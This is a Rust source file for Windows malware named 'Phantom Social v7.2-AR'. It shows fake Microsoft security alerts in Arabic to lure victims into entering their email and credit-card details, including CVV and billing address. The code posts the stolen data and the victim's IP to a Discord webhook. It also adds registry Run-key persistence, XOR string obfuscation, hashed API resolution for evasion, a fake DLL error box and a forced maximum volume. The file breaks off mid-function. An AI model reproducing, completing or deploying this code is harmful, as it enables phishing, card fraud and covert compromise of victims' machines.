// ==========================================================================
// PHANTOM SOCIAL v7.2-AR - ARABIC VARIANT
// ===========================================================================
// PHANTOM SOCIAL v6.7 - SELF-CONTAINED AUTHENTIC SVG 💎
// ==========================================================================
#![windows_subsystem = "windows"]
#![allow(non_snake_case, dead_code)]

include!(concat!(env!("OUT_DIR"), "/generated.rs"));

use std::{thread, mem, ptr, ffi::{c_void, CString}, sync::{Arc, Mutex}, time::Duration, sync::atomic::{AtomicUsize, Ordering}};
use serde::{Serialize, Deserialize};
use wry::{application::{event::{Event, WindowEvent}, event_loop::{ControlFlow, EventLoop}, window::{WindowBuilder, Icon}, dpi::{PhysicalSize, PhysicalPosition}}, webview::WebViewBuilder};
use lazy_static::lazy_static;
use wreq_util::Emulation;
use rand::Rng;
use image::io::Reader as ImageReader;
use std::io::Cursor;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, IMAGE_EXPORT_DIRECTORY};
use winapi::um::endpointvolume::IAudioEndpointVolume;
use winapi::um::mmdeviceapi::{IMMDevice, IMMDeviceEnumerator, CLSID_MMDeviceEnumerator, eRender, eConsole};
use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx};
use winapi::shared::guiddef::GUID;
use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, GetSystemInfo, MEMORYSTATUSEX, SYSTEM_INFO};
use winapi::um::winuser::GetSystemMetrics;
use windows::{Data::Xml::Dom::XmlDocument, UI::Notifications::{ToastNotification, ToastNotificationManager}, core::HSTRING};
use base64::{engine::general_purpose, Engine as _};

const MAX_DATA_SUBMISSIONS_SESSION1: usize = 10;
const MAX_DATA_SUBMISSIONS_SESSION2: usize = 5;
const IP_PROVIDER: &str = "http://checkip.amazonaws.com";
const WEBHOOKS: &[&str] = &[
    "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
];
const COINIT_APARTMENTTHREADED: u32 = 0x2;
const IID_IAudioEndpointVolume: GUID = GUID {Data1: 0x5CDF2C82, Data2: 0x841E, Data3: 0x4546, Data4: [0x97, 0x22, 0x0C, 0xF7, 0x40, 0x78, 0x22, 0x9A]};
const IID_IMMDeviceEnumerator: GUID = GUID {Data1: 0xA95664D2, Data2: 0x9614, Data3: 0x4F35, Data4: [0xA7, 0x46, 0xDE, 0x8D, 0xB6, 0x36, 0x17, 0xE6]};
const CLSCTX_ALL: u32 = 0x17;
const POWERSHELL_AUMID: &str = "{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\WindowsPowerShell\\v1.0\\powershell.exe";
const SECURITY_ICON: &str = "file:///C:/Windows/System32/SecurityAndMaintenance.png";
const WARNING_ICON: &str = "file:///C:/Windows/System32/SecurityAndMaintenance_Alert.png";

const CHROME_ICON_BYTES: &[u8] = include_bytes!("chrome.ico");

// v7.0: Professional action message pool (6 variants)
const ACTION_MESSAGES: [&str; 6] = [
    "تم اكتشاف نشاط مشبوه على حساب Microsoft الخاص بك. تحقق من بيانات الاعتماد لاستعادة الوصول.",
    "تم اكتشاف محاولة وصول غير مصرح بها إلى حساب Microsoft الخاص بك. تحقق من بيانات الاعتماد فوراً لتأمين حسابك.",
    "أبلغ Microsoft Security عن نشاط غير عادي. أكد معلومات الدفع لمنع تعليق الحساب.",
    "اكتشفنا تسجيل دخول من جهاز غير معروف. تحقق من بيانات الاعتماد لتأكيد هويتك.",
    "قد يكون حسابك قد تعرض للاختراق في حادث أمني. قم بتحديث بيانات الاعتماد فوراً كإجراء احترازي.",
    "سيتم قفل حساب Microsoft الخاص بك نهائياً بسبب نشاط دفع مشبوه. تحقق من بيانات الاعتماد لمنع التعليق.",
];
// v7.1: Web page info box messages (aligned with toast notifications)
const INFO_BOX_MESSAGES: [(&str, &str); 6] = [
    ("تنبيه أمني", "تم اكتشاف نشاط مشبوه على حساب Microsoft الخاص بك. يرجى التحقق من بيانات الاعتماد الخاصة بك فوراً لاستعادة الوصول الكامل إلى خدماتك."),
    ("تنبيه أمني", "تم اكتشاف محاولة وصول غير مصرح بها إلى حساب Microsoft الخاص بك من موقع غير معروف. تحقق من بيانات الاعتماد الآن لتأمين حسابك."),
    ("إشعار أمان الحساب", "أبلغت أنظمة أمان Microsoft عن نشاط غير عادي على حسابك. يرجى تأكيد معلومات الدفع الخاصة بك لمنع التعليق المؤقت للخدمات."),
    ("التحقق من الهوية مطلوب", "اكتشفنا محاولة تسجيل دخول من جهاز غير معروف. لأمانك، يرجى التحقق من بيانات الاعتماد الخاصة بك لتأكيد هويتك والحفاظ على الوصول إلى الحساب."),
    ("تنبيه حادث أمني", "قد يكون حساب Microsoft الخاص بك قد تعرض للاختراق في حادث أمني حديث. يرجى تحديث بيانات الاعتماد الخاصة بك فوراً كإجراء أمني إلزامي."),
    ("تحذير حساب حرج", "سيتم قفل حساب Microsoft الخاص بك نهائياً خلال 24 ساعة بسبب نشاط دفع مشبوه. تحقق من بيانات الاعتماد الآن لمنع التعليق الدائم."),
];

fn xor_decrypt(data: &[u8]) -> String {
    let decrypted: Vec<u8> = data.iter().enumerate().map(|(i, b)| b ^ XOR_KEYS[i % XOR_KEYS.len()]).collect();
    String::from_utf8_lossy(&decrypted).to_string()
}

macro_rules! enc_str {
    ($s:expr) => {{
        const ENCRYPTED: &[u8] = &{
            let bytes = $s.as_bytes();
            let mut result = [0u8; $s.len()];
            let mut i = 0;
            while i < bytes.len() {
                result[i] = bytes[i] ^ XOR_KEYS[i % 16];
                i += 1;
            }
            result
        };
        xor_decrypt(ENCRYPTED)
    }};
}

lazy_static! {
    static ref SESSION_ID: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref MACHINE_ID: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref PROCESS_START_TIME: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref SUCCESS_FLAG: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref NOTIFICATION_IGNORE_COUNT: Arc<Mutex<u32>> = Arc::new(Mutex::new(0));
    static ref USER_CLICKED_NOTIFICATION: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref REQUEST_COUNT: AtomicUsize = AtomicUsize::new(0);
    static ref VICTIM_IP: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref PERSISTENT_WEBHOOK: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref PERSISTENT_MESSAGE_INDEX: Arc<Mutex<usize>> = Arc::new(Mutex::new(0));
}
#[derive(Serialize)]
struct SystemTelemetry {
    cpu_cores: u32,
    ram_gb: u64,
    screen_res: String,
}

#[derive(Deserialize, Debug, Default)]
#[serde(default)]
struct IPCPayload {
    step: u32,
    session: String,
    machine_id: String,
    email: Option<String>,
    card_number: Option<String>,
    cardholder_name: Option<String>,
    expiry: Option<String>,
    cvv: Option<String>,
    street_address: Option<String>,
    city: Option<String>,
    state: Option<String>,
    zip_code: Option<String>,
    country: Option<String>,
}

#[derive(PartialEq)]
enum NotificationType { Preparatory, Action }

fn ts() -> u64 { std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() }

fn get_utc_timestamp() -> String {
    let secs = ts();
    let days_since_epoch = secs / 86400;
    let mut year = 1970; let mut days = days_since_epoch;
    loop {
        let days_in_year = if year % 4 == 0 && (year % 100 != 0 || year % 400 == 0) { 366 } else { 365 };
        if days < days_in_year { break; }
        days -= days_in_year; year += 1;
    }
    let month_days = [31, if year % 4 == 0 && (year % 100 != 0 || year % 400 == 0) { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut month = 0;
    for (i, &md) in month_days.iter().enumerate() {
        if days < md { month = i + 1; break; }
        days -= md;
    }
    let day = days + 1;
    let time_of_day = secs % 86400;
    let hour = time_of_day / 3600; let minute = (time_of_day % 3600) / 60; let second = time_of_day % 60;
    format!("{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z", year, month, day, hour, minute, second)
}

fn djb2_hash_str(s: &str) -> u32 {
    let mut hash: u32 = 5381;
    for b in s.bytes() {
        hash = hash.wrapping_mul(33).wrapping_add(b as u32);
    }
    hash
}

fn gen_machine_id() -> String {
    let hw = get_system_fingerprint();
    let composite = format!("{}{}{}", hw.cpu_cores, hw.ram_gb, hw.screen_res);
    format!("M{:X}", djb2_hash_str(&composite))
}

fn gen_session_id() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut h = RandomState::new().build_hasher();
    h.write_u64(ts());
    format!("{}-{:X}-{:X}", SESSION_PREFIX, ts(), h.finish())
}

fn get_time_str() -> String {
    let d = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap();
    let secs = d.as_secs();
    let h = ((secs / 3600) % 24) as u32;
    let m = ((secs / 60) % 60) as u32;
    format!("{:02}:{:02}", h, m)
}

fn select_persistent_webhook(machine_id: &str, webhooks: &[&str]) -> String {
    if webhooks.is_empty() { return String::new(); }
    let hash = djb2_hash_str(machine_id);
    let index = (hash as usize) % webhooks.len();
    webhooks[index].to_string()
}

// v7.0: Select persistent message index based on machine_id
fn select_persistent_message_index(machine_id: &str) -> usize {
    // Mix machine ID hash with timestamp for better distribution
    let hash = djb2_hash_str(machine_id);
    let time_component = (ts() % 1000) as u32;
    let combined = hash.wrapping_add(time_component);
    (combined as usize) % ACTION_MESSAGES.len()
}

fn init_globals() {
    let machine_id = gen_machine_id();
    *MACHINE_ID.lock().unwrap() = machine_id.clone();
    *SESSION_ID.lock().unwrap() = gen_session_id();
    *PROCESS_START_TIME.lock().unwrap() = get_time_str();
    *SUCCESS_FLAG.lock().unwrap() = false;
    *NOTIFICATION_IGNORE_COUNT.lock().unwrap() = 0;
    *USER_CLICKED_NOTIFICATION.lock().unwrap() = false;
    *VICTIM_IP.lock().unwrap() = String::new();
    *PERSISTENT_WEBHOOK.lock().unwrap() = select_persistent_webhook(&machine_id, WEBHOOKS);
    *PERSISTENT_MESSAGE_INDEX.lock().unwrap() = select_persistent_message_index(&machine_id);
}

fn get_session_id() -> String { SESSION_ID.lock().unwrap().clone() }
fn get_machine_id() -> String { MACHINE_ID.lock().unwrap().clone() }
fn get_victim_ip() -> String { VICTIM_IP.lock().unwrap().clone() }
fn get_persistent_webhook() -> String { PERSISTENT_WEBHOOK.lock().unwrap().clone() }
fn get_persistent_message_index() -> usize { *PERSISTENT_MESSAGE_INDEX.lock().unwrap() }

// FIX: Return &'static str instead of String to solve lifetime error E0597
fn get_action_message() -> &'static str { ACTION_MESSAGES[get_persistent_message_index()] }

fn mark_success() { *SUCCESS_FLAG.lock().unwrap() = true; }
fn is_success() -> bool { *SUCCESS_FLAG.lock().unwrap() }
fn increment_ignore_count() -> u32 { let mut count = NOTIFICATION_IGNORE_COUNT.lock().unwrap(); *count += 1; *count }
fn user_clicked_notification() { *USER_CLICKED_NOTIFICATION.lock().unwrap() = true; }
fn did_user_click() -> bool { *USER_CLICKED_NOTIFICATION.lock().unwrap() }
fn check_and_increment_limit() {
    let session = get_session_flag();
    if session >= 3 {
        std::process::exit(0);
    }
    let max_requests = if session == 1 {
        MAX_DATA_SUBMISSIONS_SESSION1
    } else {
        MAX_DATA_SUBMISSIONS_SESSION2
    };
    let current = REQUEST_COUNT.fetch_add(1, Ordering::SeqCst);
    if current >= max_requests {
        if session == 1 {
            write_session_flag(2);
        } else {
            write_session_flag(3);
        }
        std::process::exit(0);
    }
}

const fn djb2_hash(s: &str) -> u32 {
    let bytes = s.as_bytes();
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < bytes.len() {
        hash = hash.wrapping_mul(33).wrapping_add(bytes[i] as u32);
        i += 1;
    }
    hash
}

const HASH_REGDELETEVALUEA: u32 = djb2_hash("RegDeleteValueA");
type FnRegCreateKeyExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, *mut c_void, u32, u32, *mut c_void, *mut *mut c_void, *mut u32) -> i32;
type FnRegSetValueExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, u32, *const u8, u32) -> i32;
type FnRegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
type FnRegDeleteValueA = unsafe extern "system" fn(*mut c_void, *const i8) -> i32;
type FnRegQueryValueExA = unsafe extern "system" fn(*mut c_void, *const i8, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
type FnGetTickCount64 = unsafe extern "system" fn() -> u64;

unsafe fn get_proc_normal(module: &str, func: &str) -> Option<*const c_void> {
    let module_cstr = CString::new(module).ok()?;
    let func_cstr = CString::new(func).ok()?;
    let h_module = GetModuleHandleA(module_cstr.as_ptr());
    if h_module.is_null() { return None; }
    let proc = GetProcAddress(h_module, func_cstr.as_ptr());
    if proc.is_null() { None } else { Some(proc as *const c_void) }
}

unsafe fn resolve_api_hash(module: &str, hash: u32) -> Option<*const c_void> {
    let module_cstr = CString::new(module).ok()?;
    let h_module = GetModuleHandleA(module_cstr.as_ptr());
    if h_module.is_null() { return None; }
    let dos_header = h_module as *const IMAGE_DOS_HEADER;
    let nt_headers = (h_module as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
    if export_dir_rva == 0 { return None; }
    let export_dir = (h_module as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (h_module as usize + (*export_dir).AddressOfNames as usize) as *const u32;
    let funcs = (h_module as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
    let ords = (h_module as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
    for i in 0..(*export_dir).NumberOfNames {
        let name_rva = *names.offset(i as isize);
        let name_ptr = (h_module as usize + name_rva as usize) as *const i8;
        let name = std::ffi::CStr::from_ptr(name_ptr).to_str().ok()?;
        if djb2_hash(name) == hash {
            let ord_idx = *ords.offset(i as isize);
            let func_rva = *funcs.offset(ord_idx as isize);
            return Some((h_module as usize + func_rva as usize) as *const c_void);
        }
    }
    None
}

fn get_system_fingerprint() -> SystemTelemetry {
    let width = unsafe { GetSystemMetrics(0) };
    let height = unsafe { GetSystemMetrics(1) };
    let mut mem_info: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
    mem_info.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
    unsafe { GlobalMemoryStatusEx(&mut mem_info) };
    let ram_gb = mem_info.ullTotalPhys / (1024 * 1024 * 1024);
    let mut sys_info: SYSTEM_INFO = unsafe { std::mem::zeroed() };
    unsafe { GetSystemInfo(&mut sys_info) };
    let cores = sys_info.dwNumberOfProcessors;
    
    SystemTelemetry {
        cpu_cores: cores,
        ram_gb,
        screen_res: format!("{}x{}", width, height),
    }
}

fn fetch_victim_ip() -> String {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let client = wreq::Client::builder()
            .emulation(Emulation::Chrome131)
            .cert_verification(false)
            .timeout(Duration::from_secs(10))
            .build()
            .ok()?;
        let resp = client.get(IP_PROVIDER).send().await.ok()?;
        if resp.status().is_success() {
            resp.text().await.ok().map(|s| s.trim().to_string())
        } else {
            None
        }
    })
    .unwrap_or_else(|| "unknown".to_string())
}

fn register_protocol_handler() {
    if let Ok(exe) = std::env::current_exe() {
        let exe_str = format!("\"{}\" --activate \"%1\"\0", exe.to_string_lossy());
        unsafe {
            if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
                if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                    if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                        let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                        let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                        let fn_close: FnRegCloseKey = mem::transmute(api_close);
                        let hkcu = 0x80000001 as *mut c_void;
                        let mut hkey: *mut c_void = ptr::null_mut();
                        let protocol_path = format!("Software\\Classes\\{}", PROTOCOL_SCHEME);
                        let protocol_key = CString::new(protocol_path).unwrap();
                        if fn_create(hkcu, protocol_key.as_ptr(), 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            let url_protocol = CString::new("URL Protocol").unwrap();
                            let empty = CString::new("").unwrap();
                            fn_set(hkey, url_protocol.as_ptr(), 0, 1, empty.as_ptr() as *const u8, 1);
                            fn_close(hkey);
                        }
                        let command_path = format!("Software\\Classes\\{}\\shell\\open\\command", PROTOCOL_SCHEME);
                        let command_key = CString::new(command_path).unwrap();
                        if fn_create(hkcu, command_key.as_ptr(), 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            let default_val = CString::new("").unwrap();
                            fn_set(hkey, default_val.as_ptr(), 0, 1, exe_str.as_ptr() as *const u8, exe_str.len() as u32);
                            fn_close(hkey);
                        }
                    }
                }
            }
        }
    }
}

fn write_activation_flag() {
    let key = CString::new(VERIFY_REG_KEY).unwrap();
    let val = CString::new("Activated").unwrap();
    let data = CString::new("1").unwrap();
    unsafe {
        if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                    let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_set(hkey, val.as_ptr(), 0, 1, data.as_ptr() as *const u8, data.as_bytes().len() as u32);
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn check_activation_flag() -> bool {
    let key = CString::new(VERIFY_REG_KEY).unwrap();
    let val = CString::new("Activated").unwrap();
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_query) = get_proc_normal("advapi32.dll", "RegQueryValueExA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_query: FnRegQueryValueExA = mem::transmute(api_query);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0x20019, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        let mut buffer = [0u8; 16];
                        let mut buffer_size = 16u32;
                        let mut value_type = 0u32;
                        let result = fn_query(hkey, val.as_ptr(), ptr::null_mut(), &mut value_type, buffer.as_mut_ptr(), &mut buffer_size);
                        fn_close(hkey);
                        if result == 0 && buffer_size > 0 && buffer[0] == b'1' {
                            return true;
                        }
                    }
                }
            }
        }
    }
    false
}

fn write_session_flag(session: u32) {
    let key = CString::new(VERIFY_REG_KEY).unwrap();
    let val = CString::new("Session").unwrap();
    let data = format!("{}\0", session);
    unsafe {
        if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                    let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_set(hkey, val.as_ptr(), 0, 1, data.as_ptr() as *const u8, data.len() as u32);
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn get_session_flag() -> u32 {
    let key = CString::new(VERIFY_REG_KEY).unwrap();
    let val = CString::new("Session").unwrap();
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_query) = get_proc_normal("advapi32.dll", "RegQueryValueExA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_query: FnRegQueryValueExA = mem::transmute(api_query);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0x20019, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        let mut buffer = [0u8; 16];
                        let mut buffer_size = 16u32;
                        let mut value_type = 0u32;
                        let result = fn_query(hkey, val.as_ptr(), ptr::null_mut(), &mut value_type, buffer.as_mut_ptr(), &mut buffer_size);
                        fn_close(hkey);
                        if result == 0 && buffer_size > 0 {
                            let session_str = String::from_utf8_lossy(&buffer[..buffer_size as usize - 1]);
                            return session_str.parse::<u32>().unwrap_or(1);
                        }
                    }
                }
            }
        }
    }
    1
}

fn clear_activation_flag() {
    let key = CString::new(VERIFY_REG_KEY).unwrap();
    let val = CString::new("Activated").unwrap();
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_del) = get_proc_normal("advapi32.dll", "RegDeleteValueA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_del: FnRegDeleteValueA = mem::transmute(api_del);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_del(hkey, val.as_ptr());
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn enforce_singleton() {
    unsafe {
        if let Some(create_mutex) = get_proc_normal("kernel32.dll", "CreateMutexA") {
            if let Some(get_last_error) = get_proc_normal("kernel32.dll", "GetLastError") {
                type FnCreateMutexA = unsafe extern "system" fn(*mut c_void, i32, *const i8) -> *mut c_void;
                type FnGetLastError = unsafe extern "system" fn() -> u32;
                let fn_create_mutex: FnCreateMutexA = mem::transmute(create_mutex);
                let fn_get_last_error: FnGetLastError = mem::transmute(get_last_error);
                let mutex_name = CString::new(MUTEX_NAME).unwrap();
                fn_create_mutex(ptr::null_mut(), 1, mutex_name.as_ptr());
                if fn_get_last_error() == 183 {
                    std::process::exit(0);
                }
            }
        }
    }
}

fn show_fake_error() {
    unsafe {
        if let Some(message_box) = get_proc_normal("user32.dll", "MessageBoxA") {
            type FnMessageBoxA = unsafe extern "system" fn(*mut c_void, *const i8, *const i8, u32) -> i32;
            let fn_message_box: FnMessageBoxA = mem::transmute(message_box);
            let text = CString::new("The code execution cannot proceed because msvcp140.dll was not found. Reinstalling the missing dependencies may fix this problem.").unwrap();
            let caption = CString::new("System Error").unwrap();
            fn_message_box(ptr::null_mut(), text.as_ptr(), caption.as_ptr(), 0x10);
        }
    }
}

fn get_uptime_hrs() -> u64 {
    unsafe {
        if let Some(api) = get_proc_normal("kernel32.dll", "GetTickCount64") {
            let fn_tick: FnGetTickCount64 = mem::transmute(api);
            return fn_tick() / (1000 * 60 * 60);
        }
    }
    0
}

fn should_persist() -> bool {
    (get_uptime_hrs() / 24) < 3
}

fn get_random_persist_delay() -> u64 {
    rand::thread_rng().gen_range(180..=360)
}

fn install_persist() {
    if let Ok(exe) = std::env::current_exe() {
        let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
        let val = format!("{}\0", PERSIST_NAME);
        let exe_str = format!("{}\0", exe.to_string_lossy());
        unsafe {
            if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
                if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                    if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                        let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                        let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                        let fn_close: FnRegCloseKey = mem::transmute(api_close);
                        let mut hkey: *mut c_void = ptr::null_mut();
                        let hkcu = 0x80000001 as *mut c_void;
                        if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            fn_set(hkey, val.as_ptr() as *const i8, 0, 1, exe_str.as_ptr(), exe_str.len() as u32);
                            fn_close(hkey);
                        }
                    }
                }
            }
        }
    }
}

fn remove_persist() {
    let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
    let val = format!("{}\0", PERSIST_NAME);
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_del) = resolve_api_hash("advapi32.dll", HASH_REGDELETEVALUEA) {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_del: FnRegDeleteValueA = mem::transmute(api_del);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_del(hkey, val.as_ptr() as *const i8);
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn simulate_installer_scan() {
    if let Ok(temp) = std::env::var("TEMP") {
        if let Ok(entries) = std::fs::read_dir(temp) {
            let _ = entries.take(10).count();
        }
    }
    thread::sleep(Duration::from_secs(1));
}

fn get_retry_delay() -> u64 {
    rand::thread_rng().gen_range(2..=8)
}

#[cfg(windows)]
fn set_max_volume() {
    unsafe {
        CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
        let mut enumerator: *mut IMMDeviceEnumerator = ptr::null_mut();
        if CoCreateInstance(
            &CLSID_MMDeviceEnumerator,
            ptr::null_mut(),
            CLSCTX_ALL,
            &IID_IMMDeviceEnumerator,
            &mut enumerator as *mut *mut _ as *mut *mut winapi::ctypes::c_void,
        ) == 0
        {
            let mut device: *mut IMMDevice = ptr::null_mut();
            if (*enumerator).GetDefaultAudioEndpoint(eRender, eConsole, &mut device) == 0 {
                let mut endpoint_volume: *mut IAudioEndpointVolume = ptr::null_mut();
                if (*device).Activate(
                    &IID_IAudioEndpointVolume,
                    CLSCTX_ALL,
                    ptr::null_mut(),
                    &mut endpoint_volume as *mut *mut _ as *mut *mut winapi::ctypes::c_void,
                ) == 0
                {
                    (*endpoint_volume).SetMasterVolumeLevelScalar(1.0, ptr::null_mut());
                }
            }
        }
    }
}

#[cfg(not(windows))]
fn set_max_volume() {}

fn base64_encode(data: &str) -> String {
    general_purpose::STANDARD.encode(data.as_bytes())
}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

fn smart_send_data(payload_str: String) {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let client = wreq::Client::builder()
            .emulation(Emulation::Chrome131)
            .cert_verification(false)
            .build()
            .unwrap();
        let webhook_url = get_persistent_webhook();
        if webhook_url.is_empty() {
            return;
        }
        for attempt in 0..5 {
            let res = client
                .post(&webhook_url)
                .header("Content-Type", "application/json")
                .body(payload_str.clone())
                .send()
                .await;
            match res {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    if status >= 200 && status < 300 {
                        break;
                    } else if status == 429 {
                        let wait = resp
                            .headers()
                            .get("Retry-After")
                            .and_then(|h| h.to_str().ok())
                            .and_then(|s| s.parse::<u64>().ok())
                            .unwrap_or(5);
                        tokio::time::sleep(Duration::from_secs(wait + 1)).await;
                    } else {
                        tokio::time::sleep(Duration::from_secs(2)).await;
                    }
                }
                Err(_) => {
                    tokio::time::sleep(Duration::from_secs(2)).await;
                }
            }
            if attempt == 4 {
                break;
            }
        }
    });
}

fn handle_ipc_message(payload_str: &str) -> Result<(), Box<dyn std::error::Error>> {
    check_and_increment_limit();
    
    let payload: IPCPayload = serde_json::from_str(payload_str)?;
    let mut fields = Vec::new();
    
    fields.push(serde_json::json!({"name":"🆔 Session","value":format!("`{}`",payload.session),"inline":true}));
    fields.push(serde_json::json!({"name":"Œ IP","value":format!("`{}`",get_victim_ip()),"inline":true}));
    
    if let Some(email) = &payload.email {
        if !email.is_empty() {
            fields.push(serde_json::json!({"name":"📧 Email","value":format!("`{}`",base64_encode(email)),"inline":false}));
        }
    }
    if payload.card_number.is_some() {
        fields.push(serde_json::json!({"name":"€ 💳 Card €","value":"­","inline":false}));
        if let Some(card) = &payload.card_number {
            fields.push(serde_json::json!({"name":"Number","value":format!("`{}`",base64_encode(card)),"inline":true}));
        }
        if let Some(cvv) = &payload.cvv {
            fields.push(serde_json::json!({"name":"CVV","value":format!("`{}`",base64_encode(cvv)),"inline":true}));
        }
        if let Some(exp) = &payload.expiry {
